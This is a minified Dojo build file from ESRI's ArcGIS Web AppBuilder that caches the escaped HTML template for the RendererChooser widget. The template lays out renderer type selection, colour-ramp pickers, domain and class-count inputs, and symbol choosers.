// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:jimu/dijit/templates/RendererChooser.html":'\x3cdiv\x3e\r\n\t\x3ctable\x3e\r\n\t\t\x3ctbody\x3e\r\n\t\t\t\x3ctr\x3e\r\n\t\t\t\t\x3ctd class\x3d"leading-td"\x3e\r\n\t\t\t\t\t\x3cdiv class\x3d"setting-section" style\x3d"display:inline-block;width:263px;"\x3e\r\n\t\t\t\t\t\t\x3ctable class\x3d"renderer-setting-table" cellpadding\x3d"0" cellspacing\x3d"0"\x3e\r\n\t\t\t\t\t\t\t\x3ccolgroup\x3e\r\n\t\t\t\t\t\t\t\t\x3ccol width\x3d"auto"\x3e\x3c/col\x3e\r\n\t\t\t\t\t\t\t\t\x3ccol width\x3d"180px"\x3e\x3c/col\x3e\r\n\t\t\t\t\t\t    \x3c/colgroup\x3e\r\n\t\t\t\t\t\t\t\x3ctbody\x3e\r\n\t\t\t\t\t\t\t\t\x3ctr data-dojo-attach-point\x3d"rendererSelectTr"\x3e\r\n\t\t\t\t\t\t\t\t\t\x3ctd class\x3d"first-td"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\x3cspan\x3e${nls.use}:\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\t\t\t\t\x3cselect data-dojo-attach-point\x3d"rendererSelect" data-dojo-type\x3d"dijit/form/Select" style\x3d"width:100%;height:30px;"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3coption value\x3d"simple" selected\x3dtrue\x3e${nls.singleSymbol}\x3c/option\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3coption value\x3d"unique"\x3e${nls.uniqueSymbol}\x3c/option\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3coption value\x3d"color"\x3e${nls.color}\x3c/option\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3coption value\x3d"size"\x3e${nls.size}\x3c/option\x3e\r\n\t\t\t\t\t\t\t\t\t\t\x3c/select\x3e\r\n\t\t\t\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\t\t\t\t\x3ctr data-dojo-attach-point\x3d"fieldSelectTr" style\x3d"display:none;"\x3e\r\n\t\t\t\t\t\t\t\t\t\x3ctd class\x3d"first-td"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\x3cspan\x3e${nls.toShow}:\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\t\t\t\t\x3ctd class\x3d"field-combobox-td"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"fieldComboBox" data-dojo-type\x3d"dijit/form/ComboBox" class\x3d"dijit-form-CombBox" style\x3d"width:100%;"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\t\t\t\t\x3ctr data-dojo-attach-point\x3d"colorBlockTr" style\x3d"display:none;"\x3e\r\n\t\t\t\t\t\t\t\t\t\x3ctd class\x3d"first-td"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\x3cspan\x3e${nls.colors}:\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"uniqueColorSelect" data-dojo-type\x3d"dijit/form/Select" style\x3d"width:100%;height:30px;"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d\'color1\'\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg  style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/c1.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d\'color2\'\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg  style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/c2.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d\'color3\'\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg  style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/c3.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d\'color4\'\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg  style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/c4.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d\'color5\'\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg  style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/c5.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d\'color6\'\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg  style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/c6.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\t\t\t\t\x3ctr data-dojo-attach-point\x3d"domainTr" style\x3d"display:none;"\x3e\r\n\t\t\t\t\t\t\t\t\t\x3ctd class\x3d"first-td"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\x3cspan\x3e${nls.domain}:\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\t\t\t\t\x3cinput data-dojo-attach-point\x3d"minDomain" type\x3d"text" data-dojo-type\x3d"dijit/form/NumberTextBox" required\x3d"true" value\x3d"0"\r\n\t\t\t\t\t\t\t\t\t\t style\x3d"width:60px;" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\x3cspan\x3e  \u2014  \x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\x3cinput data-dojo-attach-point\x3d"maxDomain" type\x3d"text" data-dojo-type\x3d"dijit/form/NumberTextBox" required\x3d"true" value\x3d"0"\r\n\t\t\t\t\t\t\t\t\t\t style\x3d"width:60px;" /\x3e\r\n\t\t\t\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\t\t\t\t\x3ctr data-dojo-attach-point\x3d"classCountTr" style\x3d"display:none;"\x3e\r\n\t\t\t\t\t\t\t\t\t\x3ctd class\x3d"first-td"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\x3cspan\x3e${nls.classes}:\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\t\t\t\t\x3cinput data-dojo-attach-point\x3d"classCount" data-dojo-type\x3d"dijit/form/NumberSpinner" style\x3d"display:inline-block;width:100px;"\r\n\t\t\t\t\t\t\t\t\t\tdata-dojo-props\x3d\'value:5,smallDelta:1,constraints:{min:2,max:20},intermediateChanges:true\' /\x3e\r\n\t\t\t\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\t\t\t\t\x3ctr data-dojo-attach-point\x3d"colorBarTr" style\x3d"display:none;"\x3e\r\n\t\t\t\t\t\t\t\t\t\x3ctd class\x3d"first-td"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\x3cspan\x3e${nls.colors}:\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"classBreaksColorSelect" data-dojo-type\x3d"dijit/form/Select" style\x3d"width:100%;height:30px;"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d"color1"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/cb1.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d"color2"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/cb2.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d"color3"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/cb3.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d"color4"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/cb4.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d"color5"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/cb5.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d"color6"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/cb6.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d"color7"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/cb7.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d"color8"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/cb8.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d"color9"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/cb9.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d"color10"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/cb10.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d"color11"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/cb11.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d"color12"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/cb12.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d"color13"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/cb13.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d"color14"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/cb14.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d"color15"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/cb15.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d"color16"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/cb16.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d"color17"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/cb17.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d"color18"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/cb18.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d"color19"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/cb19.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d"color20"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/cb20.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d"color21"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/cb21.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d"color22"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/cb22.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d"color23"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/cb23.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d"color24"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/cb24.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d"color25"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/cb25.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d"color26"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/cb26.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-value\x3d"color27"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cimg style\x3d"width:140px;height:20px;vertical-align: middle;margin-top: 1px;margin-bottom:1px;" src\x3d"${_jimuUrl}/css/images/symbol/cb27.png" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\t\t\t\t\x3ctr data-dojo-attach-point\x3d"symbolSizeDomainTr" style\x3d"display:none;"\x3e\r\n\t\t\t\t\t\t\t\t\t\x3ctd class\x3d"first-td"\x3e\r\n\t\t\t\t\t\t\t\t\t\t\x3cspan\x3e${nls.symbolSize}:\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\t\t\t\t\x3cinput data-dojo-attach-point\x3d"minSymbolSize" type\x3d"text" data-dojo-type\x3d"dijit/form/NumberTextBox" required\x3d"true" value\x3d"5" data-dojo-props\x3d"constraints:{min:1,max:50,places:0}" style\x3d"width:60px;" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\x3cspan\x3e  \u2014  \x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\x3cinput data-dojo-attach-point\x3d"maxSymbolSize" type\x3d"text" data-dojo-type\x3d"dijit/form/NumberTextBox" required\x3d"true" value\x3d"30" data-dojo-props\x3d"constraints:{min:1,max:50,places:0}"  style\x3d"width:60px;" /\x3e\r\n\t\t\t\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\t\t\t\x3c/tbody\x3e\r\n\t\t\t\t\t\t\x3c/table\x3e\r\n\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"uniqueSetting" style\x3d"display:none;"\x3e\r\n\t\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"uniqueValueDiv" class\x3d"unique-value-div"\x3e\r\n\t\t\t\t\t\t\t\t\x3ctable class\x3d"unique-symbol-table" style\x3d"width:100%;"\x3e\r\n\t\t\t\t\t\t\t\t\t\x3ctbody data-dojo-attach-point\x3d"uniqueSysTbody"\x3e\r\n\t\t\t\t\t\t\t\t\t\x3c/tbody\x3e\r\n\t\t\t\t\t\t\t\t\x3c/table\x3e\r\n\t\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\t\t\x3cdiv\x3e\r\n\t\t\t\t\t\t\t\t\x3cdiv style\x3d"padding-top:20px; margin-bottom:5px;"\x3e${nls.addValue}:\x3c/div\x3e\r\n\t\t\t\t\t\t\t\t\x3cdiv\x3e\r\n\t\t\t\t\t\t\t\t\t\x3cinput data-dojo-attach-point\x3d"uniqueEditValue" type\x3d"text" /\x3e\r\n\t\t\t\t\t\t\t\t\t\x3cspan data-dojo-attach-point\x3d"btnAddUniqueValue" class\x3d"jimu-icon jimu-icon-add"\r\n\t\t\t\t\t\t\t\t\t style\x3d\'cursor:pointer;position:relative;top:3px;\'\x3e\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\t\x3cdiv class\x3d"class-breaks-div" data-dojo-attach-point\x3d"classBreaksSetting" style\x3d"display:none;"\x3e\r\n\t\t\t\t\t\t\t\x3ctable class\x3d"class-breaks-table" style\x3d"width:100%;"\x3e\r\n\t\t\t\t\t\t\t\t\x3ctbody data-dojo-attach-point\x3d"classBreaksTbody"\x3e\r\n\t\t\t\t\t\t\t\t\x3c/tbody\x3e\r\n\t\t\t\t\t\t\t\x3c/table\x3e\r\n\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"defaultSymPreview" class\x3d"default-sym-preview"\x3e\r\n\t\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"btnDefaultSym" class\x3d"default-sym-btn jimu-btn  jimu-float-leading"\x3e${nls.setDefaultSymbol}\x3c/div\x3e\r\n\t\t\t\t\t\t    \x3cdiv data-dojo-attach-point\x3d"defaultSymPreviewDiv" class\x3d"default-symbol-node  jimu-float-leading"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\x3ctd class\x3d"trailing-td"\x3e\r\n\t\t\t\t\t\x3cdiv class\x3d"symbol-section" style\x3d"display:inline-block;"\x3e\r\n\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"defaultSymSection"\x3e\r\n\t\t\t\t\t\t\t\x3cdiv\x3e${nls.defaultSymbol}\x3c/div\x3e\r\n\t\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"defaultSymbolChooser" data-dojo-type\x3d"jimu/dijit/SymbolChooser"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"selectedSymSection" style\x3d"display:none;"\x3e\r\n\t\t\t\t\t\t\t\x3cdiv\x3e${nls.selectedSymbol}\x3c/div\x3e\r\n\t\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"uniqueSelectedSymInfoSet" style\x3d"display:none;"\x3e\r\n\t\t\t\t\t\t\t\t\x3ctable style\x3d"width:100%;"\x3e\r\n\t\t\t\t\t\t\t\t\t\x3ctbody\x3e\r\n\t\t\t\t\t\t\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cspan\x3e${nls.value}:\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cinput data-dojo-attach-point\x3d"uniqueSelectedValue" type\x3d"text" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\t\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\t\t\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cspan\x3e${nls.label}:\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cinput data-dojo-attach-point\x3d"uniqueSelectedLabel" type\x3d"text" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\t\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\t\t\t\t\t\x3c/tbody\x3e\r\n\t\t\t\t\t\t\t\t\x3c/table\x3e\r\n\t\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"classBreaksSelectedInfoSet" style\x3d"display:none;"\x3e\r\n\t\t\t\t\t\t\t\t\x3ctable style\x3d"width:100%;margin-top:10px;"\x3e\r\n\t\t\t\t\t\t\t\t\t\x3ctbody\x3e\r\n\t\t\t\t\t\t\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cspan\x3e${nls.range}:\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cinput data-dojo-attach-point\x3d"selectedFrom" type\x3d"text" data-dojo-type\x3d"dijit/form/NumberTextBox" required\x3d"true" value\x3d"0" style\x3d"width:60px;" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cspan\x3e  \u2014  \x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cinput data-dojo-attach-point\x3d"selectedTo" type\x3d"text" data-dojo-type\x3d"dijit/form/NumberTextBox" required\x3d"true" value\x3d"0"  style\x3d"width:60px;" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\t\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\t\t\t\t\t\t\x3ctr\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cspan\x3e${nls.label}:\x3c/span\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3ctd\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\t\x3cinput data-dojo-attach-point\x3d"classBreakSelectedLabel" type\x3d"text" /\x3e\r\n\t\t\t\t\t\t\t\t\t\t\t\x3c/td\x3e\r\n\t\t\t\t\t\t\t\t\t\t\x3c/tr\x3e\r\n\t\t\t\t\t\t\t\t\t\x3c/tbody\x3e\r\n\t\t\t\t\t\t\t\t\x3c/table\x3e\r\n\t\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\t\t\x3cdiv data-dojo-attach-point\x3d"selectedSymbolChooser" data-dojo-type\x3d"jimu/dijit/SymbolChooser"\x3e\x3c/div\x3e\r\n\t\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\t\x3c/div\x3e\r\n\t\t\t\t\x3c/td\x3e\r\n\t\t\t\x3c/tr\x3e\r\n\t\t\x3c/tbody\x3e\r\n\t\x3c/table\x3e\r\n\x3c/div\x3e'}});
